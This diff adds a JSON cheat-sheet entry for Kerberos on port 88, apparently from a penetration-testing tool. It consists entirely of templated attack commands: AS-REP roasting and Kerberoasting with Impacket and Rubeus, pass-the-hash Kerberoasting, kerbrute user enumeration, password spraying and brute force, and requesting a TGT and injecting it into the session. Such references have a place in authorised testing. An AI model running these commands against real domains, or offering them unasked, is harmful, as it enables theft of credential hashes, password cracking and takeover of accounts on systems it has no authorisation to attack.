@@ -1,0 +1,97 @@
+{
+  "port": 88,
+  "protocol": "tcp",
+  "service": "Kerberos",
+  "description": "Kerberos authentication service — AS-REP Roasting, Kerberoasting, user enumeration, and password spraying.",
+  "tools": [
+    {
+      "name": "GetNPUsers.py (Impacket) — AS-REP Roasting",
+      "description": "Request TGTs for accounts that have 'Do not require Kerberos preauthentication' enabled.",
+      "commands": [
+        {
+          "title": "AS-REP Roast with user list",
+          "command": "GetNPUsers.py '{{DOMAIN}}/' -usersfile {{USERLIST}} -dc-ip {{IP}} -format hashcat -outputfile asrep_hashes.txt",
+          "description": "Spray a user list for AS-REP roastable accounts and save hashes in Hashcat format."
+        },
+        {
+          "title": "AS-REP Roast a single user",
+          "command": "GetNPUsers.py '{{DOMAIN}}/{{USERNAME}}' -no-pass -dc-ip {{IP}} -format hashcat",
+          "description": "Request AS-REP hash for a single known user."
+        },
+        {
+          "title": "AS-REP Roast — enumerate all (authenticated)",
+          "command": "GetNPUsers.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}' -dc-ip {{IP}} -request -format hashcat -outputfile asrep_hashes.txt",
+          "description": "Authenticate and automatically find all AS-REP roastable accounts in the domain."
+        }
+      ]
+    },
+    {
+      "name": "GetUserSPNs.py (Impacket) — Kerberoasting",
+      "description": "Request TGS tickets for service accounts to crack offline.",
+      "commands": [
+        {
+          "title": "Kerberoast — list SPNs",
+          "command": "GetUserSPNs.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}' -dc-ip {{IP}}",
+          "description": "List all user accounts with SPNs set (Kerberoastable targets)."
+        },
+        {
+          "title": "Kerberoast — request TGS tickets",
+          "command": "GetUserSPNs.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}' -dc-ip {{IP}} -request -outputfile kerberoast_hashes.txt",
+          "description": "Request TGS tickets and save in crackable format."
+        },
+        {
+          "title": "Kerberoast with NTLM hash (PtH)",
+          "command": "GetUserSPNs.py '{{DOMAIN}}/{{USERNAME}}' -hashes ':{{NTHASH}}' -dc-ip {{IP}} -request -outputfile kerberoast_hashes.txt",
+          "description": "Kerberoast using pass-the-hash authentication."
+        }
+      ]
+    },
+    {
+      "name": "kerbrute",
+      "description": "Fast Kerberos brute-forcer for user enumeration and password spraying.",
+      "commands": [
+        {
+          "title": "User enumeration",
+          "command": "kerbrute userenum --dc {{IP}} -d {{DOMAIN}} {{USERLIST}}",
+          "description": "Enumerate valid domain usernames via Kerberos pre-auth responses."
+        },
+        {
+          "title": "Password spray",
+          "command": "kerbrute passwordspray --dc {{IP}} -d {{DOMAIN}} {{USERLIST}} '{{PASSWORD}}'",
+          "description": "Spray a single password against all users in the list."
+        },
+        {
+          "title": "Brute-force single user",
+          "command": "kerbrute bruteuser --dc {{IP}} -d {{DOMAIN}} {{WORDLIST}} {{USERNAME}}",
+          "description": "Brute-force a password for a single known username."
+        }
+      ]
+    },
+    {
+      "name": "Rubeus (Windows)",
+      "description": "Windows-native Kerberos toolkit. Run from a domain-joined host or via C2.",
+      "commands": [
+        {
+          "title": "AS-REP Roast all vulnerable users",
+          "command": "Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt",
+          "description": "Find and roast all AS-REP vulnerable accounts from a domain context."
+        },
+        {
+          "title": "Kerberoast all SPNs",
+          "command": "Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt",
+          "description": "Request TGS for all Kerberoastable accounts."
+        },
+        {
+          "title": "Kerberoast a specific SPN",
+          "command": "Rubeus.exe kerberoast /user:{{USERNAME}} /format:hashcat /outfile:kerberoast_hashes.txt",
+          "description": "Target a specific service account for Kerberoasting."
+        },
+        {
+          "title": "Request TGT with credentials",
+          "command": "Rubeus.exe asktgt /user:{{USERNAME}} /password:{{PASSWORD}} /domain:{{DOMAIN}} /ptt",
+          "description": "Request a TGT and inject it into the current session."
+        }
+      ]
+    }
+  ]
+}
